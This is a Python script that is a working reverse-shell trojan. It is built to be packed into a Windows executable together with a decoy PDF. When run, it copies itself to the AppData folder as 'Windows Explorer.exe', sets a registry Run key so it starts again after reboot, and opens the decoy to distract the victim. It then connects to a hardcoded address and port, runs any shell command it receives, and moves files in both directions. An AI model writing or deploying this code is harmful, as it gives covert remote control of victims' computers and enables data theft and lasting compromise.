#!/usr/bin/env python3
import multiprocessing.connection as connection
from subprocess import check_output, call, Popen, DEVNULL
import os
import sys
from shutil import copyfile

# pyinstaller --onefile --noconsole --add-data "stack_for_fun.pdf;." reverse.py

address = "192.168.1.20"
port = 4444
key = b"cuylerwashere"

def become_windows_persistent():
    try:
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            copyfile(sys.executable, file_location)
            call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{}" /f'.format(file_location), shell=True)
    except:
        pass

def open_windows_data_file():
    try:
        file_name = sys._MEIPASS + "\stack_for_fun.pdf"
        Popen(file_name, shell=True)
    except:
        pass

def write_file(filename, contents):
    with open(filename, 'wb') as fd:
        fd.write(contents)

def get_file_contents(filepath):
    with open(filepath, 'rb') as fd:
        contents = fd.read()
    return contents

def execute(conn, command):
    try:
        if command.startswith("cd"):
            os.chdir(command.split(' ')[1])
            results = b"[+] Changed into: " + os.getcwd().encode()
        elif command.startswith("download"):
            filepath = command.split(' ')[1]
            results = get_file_contents(filepath)
        elif command.startswith("upload"):
            filename = command.split(' ')[1].split('/')[-1]
            conn.send_bytes(b"Ready")
            file_contents = conn.recv_bytes()
            if not file_contents.startswith(b"Failed"):
                write_file(filename, file_contents)
            return
        else:
            results = check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    except:
        results = b"[-] Failed to execute " + command.encode()

    conn.send_bytes(results)

try:
    become_windows_persistent()
    open_windows_data_file()
    with connection.Client((address, port), authkey=key) as conn:
        while True:
            command = conn.recv()
            execute(conn, command)
except:
    sys.exit()

